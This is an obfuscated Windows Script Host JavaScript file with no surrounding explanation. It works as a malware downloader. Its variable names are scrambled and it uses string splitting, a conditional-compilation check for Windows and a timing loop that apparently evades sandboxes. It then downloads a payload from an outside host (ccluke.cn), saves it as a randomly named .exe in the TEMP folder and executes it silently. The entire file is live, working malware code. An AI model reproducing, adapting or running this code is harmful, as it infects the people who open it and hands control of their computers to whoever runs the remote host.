var _G = false;
var _TL = "CreateObject";
var _W = function _I() {return WScript[_TL]("WScript"+".Shell");}(), _N = 11;
var _UW = "MSXML2.XMLHTTP";
var _H = 2123213;
var _O0 = 0;
function _Z0(_RE){_W["Run"](_RE, _O0, _O0);};
function _B(){return _UW + "";};
function _A(_MT, _HV){_O0 = _O0 * 1; return _MT - _HV;};
function _O(){return _TL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _G = true;
  @end
@*/
if (_G)
{
var _Y = "";
function _D(){return 22;};
var _PZ = 0; var _R = 0;
function _QB()
{
var _O1 = new this["Date"]();
var _ZE = _O1["getUTCMilliseconds"]();
WScript["Sleep"](_D());
var _O1 = new this["Date"]();
var _UR = _O1["getUTCMilliseconds"]();
WScript["Sleep"](_D());
var _O1 = new this["Date"]();
var _T = _O1["getUTCMilliseconds"]();
var _PZ = "_M";
_PZ = _A(_UR, _ZE);
var _R = "_XP";
_R = _A(_T, _UR);
_Y = "open";
return _A(_PZ, _R);
}
var _DP = false;
var _X = false;
for (var _Z1 = _O0; _Z1 < _D() * 1; _Z1++){if (_QB() != _O0){
_DP = true; 
_R = "31" + 11 * _PZ + _R; 
_X = true; 
break;
}}
function _LL() {return ((_DP == true) && (_DP == _X)) ? 1 : _O0;};
if (_DP && _LL() && _X){
function _Z() {return _W["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DVSl1PJBqsz8.ex" + "e";};
 _MN = _B();
 _M0 = WScript[_TL](_MN);
 var _IW = 1;
 while (_IW){
try {
	if (_IW == 1)
	{
		_M0[_Y]("GET", "http://ccluke.cn/b7eus", false);
		_M0["send"]();
		_S = "Sleep";
	}
	WScript[_S](_D() + 120); 
	if (_M0["readystate"] < 2 * 2) continue;
	_IW = _O0;
	function _J(_OM) {var _KP = (1, 2, 3, 4, 5, _OM); return _KP;};
	_WQ = WScript[_O()]("ADODB.Stream");
	_MN = _WQ;
	_MN[_Y]();
	_MN["type"] = _J(1);
	_MN["write"](_M0["ResponseBody"]);
	_WQ["position"] = _J(_O0);
	_MN["Save" + "ToFile"](_Z(), 2);
	_WQ["cl"+"ose"]();
	_Q = _Z();
	_Z0(_Q);
} catch(_LV){};
}
}
}

